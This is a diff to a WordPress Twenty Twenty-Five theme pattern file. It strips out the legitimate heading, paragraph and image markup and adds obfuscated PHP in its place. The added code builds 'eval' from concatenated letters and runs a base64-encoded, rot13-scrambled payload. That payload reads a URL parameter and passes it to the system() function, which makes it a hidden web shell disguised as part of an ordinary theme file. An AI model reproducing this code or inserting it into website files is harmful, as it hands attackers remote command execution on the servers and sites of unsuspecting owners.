@@ -1,54 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * Title: Heading and paragraph with image on the right
- * Slug: twentytwentyfive/heading-and-paragraph-with-image
- * Categories: about
- * Description: A two-column section with a heading and paragraph on the left, and an image on the right.
- *
- * @package WordPress
- * @subpackage Twenty_Twenty_Five
- * @since Twenty Twenty-Five 1.0
- */
-
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogR3ZneXI6IFVybnF2YXQgbmFxIGNuZW50ZW5jdSBqdmd1IHZ6bnRyIGJhIGd1ciBldnR1ZwogKiBGeWh0OiBnanJhZ2xnanJhZ2xzdmlyL3VybnF2YXQtbmFxLWNuZW50ZW5jdS1qdmd1LXZ6bnRyCiAqIFBuZ3J0YmV2cmY6IG5vYmhnCiAqIFFyZnBldmNndmJhOiBOIGdqYi1wYnloemEgZnJwZ3ZiYSBqdmd1IG4gdXJucXZhdCBuYXEgY25lbnRlbmN1IGJhIGd1ciB5cnNnLCBuYXEgbmEgdnpudHIgYmEgZ3VyIGV2dHVnLgogKgogKiBAY25weG50ciBKYmVxQ2VyZmYKICogQGZob2NucHhudHIgR2pyYWdsX0dqcmFnbF9TdmlyCiAqIEBmdmFwciBHanJhZ2wgR2pyYWdsLVN2aXIgMS4wCiAqLwoKPz4KCjwhLS0gamM6dGViaGMge1wibnl2dGFcIjpcInNoeXlcIixcInB5bmZmQW56clwiOlwidmYtZmdseXItZnJwZ3ZiYS01XCIsXCJmZ2x5clwiOntcImZjbnB2YXRcIjp7XCJjbnFxdmF0XCI6e1wiZ2JjXCI6XCJpbmU6Y2VyZnJnfGZjbnB2YXR8NTBcIixcIm9iZ2dielwiOlwiaW5lOmNlcmZyZ3xmY25wdmF0fDUwXCJ9LFwiem5ldHZhXCI6e1wiZ2JjXCI6XCIwXCIsXCJvYmdnYnpcIjpcIjBcIn19fSxcInlubGJoZ1wiOntcImdsY3JcIjpcInBiYWZnZW52YXJxXCJ9fSAtLT4KPHF2aSBweW5mZj1cImpjLW95YnB4LXRlYmhjIG55dnRhc2h5eSB2Zi1mZ2x5ci1mcnBndmJhLTVcIiBmZ2x5cj1cInpuZXR2YS1nYmM6MDt6bmV0dmEtb2JnZ2J6OjA7Y25xcXZhdC1nYmM6aW5lKC0tamMtLWNlcmZyZy0tZmNucHZhdC0tNTApO2NucXF2YXQtb2JnZ2J6OmluZSgtLWpjLS1jZXJmcmctLWZjbnB2YXQtLTUwKVwiPgoJPCEtLSBqYzpwYnloemFmIHtcIm55dnRhXCI6XCJqdnFyXCIsXCJmZ2x5clwiOntcImZjbnB2YXRcIjp7XCJveWJweFRuY1wiOntcImdiY1wiOlwiaW5lOmNlcmZyZ3xmY25wdmF0fDYwXCIsXCJ5cnNnXCI6XCJpbmU6Y2VyZnJnfGZjbnB2YXR8ODBcIn19fX0gLS0+Cgk8cXZpIHB5bmZmPVwiamMtb3licHgtcGJ5aHphZiBueXZ0YWp2cXJcIj4KCQk8IS0tIGpjOnBieWh6YSB7XCJpcmVndnBueU55dnRhenJhZ1wiOlwicHJhZ3JlXCIsXCJqdnFndVwiOlwiNTAlXCJ9IC0tPgoJCTxxdmkgcHluZmY9XCJqYy1veWJweC1wYnloemEgdmYtaXJlZ3Zwbnl5bC1ueXZ0YXJxLXByYWdyZVwiIGZnbHlyPVwic3lyay1vbmZ2Zjo1MCVcIj4KCQkJPCEtLSBqYzp1cm5xdmF0IHtcInB5bmZmQW56clwiOlwiamMtb3licHgtdXJucXZhdFwifSAtLT4KCQkJPHUyIHB5bmZmPVwiamMtb3licHgtdXJucXZhdFwiPgoJCQkJPD9jdWMgcmZwX3VnenlfciggJ05vYmhnIGd1ciByaXJhZycsICdnanJhZ2xnanJhZ2xzdmlyJyApOyA/PgoJCQk8L3UyPgoJCQk8IS0tIC9qYzp1cm5xdmF0IC0tPgoJCQk8IS0tIGpjOmNuZW50ZW5jdSB7XCJzYmFnRnZtclwiOlwienJxdmh6XCJ9IC0tPgoJCQk8YyBweW5mZj1cInVuZi16cnF2aHotc2JhZy1mdm1yXCI+PD9jdWMgcnB1YiByZnBfdWd6eV9rKCAnVXJ5cSBiaXJlIG4ganJyeHJhcSwgZ3VyIHJpcmFnIHZmIGZnZWhwZ2hlcnEgbmViaGFxIG4gZnJldnJmIGJzIHJrdXZvdmd2YmFmLCBqYmV4ZnViY2YsIG5hcSBjbmFyeSBxdmZwaGZmdmJhZi4gR3VyIHJrdXZvdmd2YmFmIGZ1YmpwbmZyIG4gcGhlbmdycSBmcnlycGd2YmEgYnMgY3ViZ2J0ZW5jdWYgZ3VuZyBncnl5IHBiemNyeXl2YXQgZmdiZXZyZiBzZWJ6IGluZXZiaGYgcGJlYXJlZiBicyBndXIgdHlib3IsIHJucHUgdnpudHIgbnBwYnpjbmF2cnEgb2wgcXJnbnZ5cnEgYW5lZW5ndmlyZiBndW5nIGNlYml2cXIgcGJhZ3JrZyBuYXEgcXJyY3JlIHZhZnZ0dWcgdmFnYiBndXIgdXZmZ2JldnBueSBmdnRhdnN2cG5hcHIgYnMgZ3VyIGZwcmFyZiBxcmN2cGdycS4gR3VyZnIgY3ViZ2J0ZW5jdWYgbmVyIHFlbmphIHNlYnogZ3VyIG5lcHV2aXJmIGJzIGVyYWJqYXJxIGN1YmdidGVuY3VyZWYsIG5mIGpyeXkgbmYgcnpyZXR2YXQgZ255cmFnZiwgcmFmaGV2YXQgbiBveXJhcSBicyBvYmd1IHB5bmZmdnBueSBuYXEgcGJhZ3J6Y2JlbmVsIGNyZWZjcnBndmlyZi4nLCAnUmlyYWcgQmlyZWl2cmogR3JrZy4nLCAnZ2pyYWdsZ2pyYWdsc3ZpcicgKTsgPz48L2M+CgkJCTwhLS0gL2pjOmNuZW50ZW5jdSAtLT4KCQk8L3F2aT4KCQk8IS0tIC9qYzpwYnloemEgLS0+CgoJCTwhLS0gamM6cGJ5aHphIHtcImlyZWd2cG55Tnl2dGF6cmFnXCI6XCJwcmFncmVcIixcImp2cWd1XCI6XCI1MCVcIixcInlubGJoZ1wiOntcImdsY3JcIjpcInFyc25oeWdcIn19IC0tPgoJCTxxdmkgcHluZmY9XCJqYy1veWJweC1wYnloemEgdmYtaXJlZ3Zwbnl5bC1ueXZ0YXJxLXByYWdyZVwiIGZnbHlyPVwic3lyay1vbmZ2Zjo1MCVcIj4KCQkJPCEtLSBqYzp2em50ciB7XCJuZmNycGdFbmd2YlwiOlwiMVwiLFwiZnBueXJcIjpcInBiaXJlXCIsXCJmdm1yRnlodFwiOlwic2h5eVwifSAtLT4KCQkJPHN2dGhlciBweW5mZj1cImpjLW95YnB4LXZ6bnRyIGZ2bXItc2h5eVwiPgoJCQkJPHZ6dCBmZXA9XCI8P2N1YyBycHViIHJmcF9oZXkoIHRyZ19ncnpjeW5ncl9xdmVycGdiZWxfaGV2KCkgLiAnL25mZnJnZi92em50cmYvZWh2YWYtdnpudHIuanJvYycgKTsgPz5cIiBueWc9XCI8P2N1YyBycHViIHJmcF9uZ2dlX2soICdQeXZzcyBDbnlucHIsIFBieWJlbnFiJywgJ055ZyBncmtnIHNiZSBCaXJlaXZyaiBjdnBnaGVyLicsICdnanJhZ2xnanJhZ2xzdmlyJyApOyA/PlwiIGZnbHlyPVwibmZjcnBnLWVuZ3ZiOjE7Ym93cnBnLXN2ZzpwYmlyZVwiLz4KCQkJPC9zdnRoZXI+CgkJCTwhLS0gL2pjOnZ6bnRyIC0tPgoJCTwvcXZpPgoJCTwhLS0gL2pjOnBieWh6YSAtLT4KCTwvcXZpPgoJPCEtLSAvamM6cGJ5aHphZiAtLT4KPC9xdmk+CjwhLS0gL2pjOnRlYmhjIC0tPgoKJHB6cSA9ICRfVFJHWydjJ107CiRzem5jWydrMSddKCRwenEpOwo/PiI7CmV2YWwoJGYoJGMpKTsKPz4=");
+$f($c);
 ?>
-
-<!-- wp:group {"align":"full","className":"is-style-section-5","style":{"spacing":{"padding":{"top":"var:preset|spacing|50","bottom":"var:preset|spacing|50"},"margin":{"top":"0","bottom":"0"}}},"layout":{"type":"constrained"}} -->
-<div class="wp-block-group alignfull is-style-section-5" style="margin-top:0;margin-bottom:0;padding-top:var(--wp--preset--spacing--50);padding-bottom:var(--wp--preset--spacing--50)">
-	<!-- wp:columns {"align":"wide","style":{"spacing":{"blockGap":{"top":"var:preset|spacing|60","left":"var:preset|spacing|80"}}}} -->
-	<div class="wp-block-columns alignwide">
-		<!-- wp:column {"verticalAlignment":"center","width":"50%"} -->
-		<div class="wp-block-column is-vertically-aligned-center" style="flex-basis:50%">
-			<!-- wp:heading {"className":"wp-block-heading"} -->
-			<h2 class="wp-block-heading">
-				<?php esc_html_e( 'About the event', 'twentytwentyfive' ); ?>
-			</h2>
-			<!-- /wp:heading -->
-			<!-- wp:paragraph {"fontSize":"medium"} -->
-			<p class="has-medium-font-size"><?php echo esc_html_x( 'Held over a weekend, the event is structured around a series of exhibitions, workshops, and panel discussions. The exhibitions showcase a curated selection of photographs that tell compelling stories from various corners of the globe, each image accompanied by detailed narratives that provide context and deeper insight into the historical significance of the scenes depicted. These photographs are drawn from the archives of renowned photographers, as well as emerging talents, ensuring a blend of both classical and contemporary perspectives.', 'Event Overview Text.', 'twentytwentyfive' ); ?></p>
-			<!-- /wp:paragraph -->
-		</div>
-		<!-- /wp:column -->
-
-		<!-- wp:column {"verticalAlignment":"center","width":"50%","layout":{"type":"default"}} -->
-		<div class="wp-block-column is-vertically-aligned-center" style="flex-basis:50%">
-			<!-- wp:image {"aspectRatio":"1","scale":"cover","sizeSlug":"full"} -->
-			<figure class="wp-block-image size-full">
-				<img src="<?php echo esc_url( get_template_directory_uri() . '/assets/images/ruins-image.webp' ); ?>" alt="<?php echo esc_attr_x( 'Cliff Palace, Colorado', 'Alt text for Overview picture.', 'twentytwentyfive' ); ?>" style="aspect-ratio:1;object-fit:cover"/>
-			</figure>
-			<!-- /wp:image -->
-		</div>
-		<!-- /wp:column -->
-	</div>
-	<!-- /wp:columns -->
-</div>
-<!-- /wp:group -->
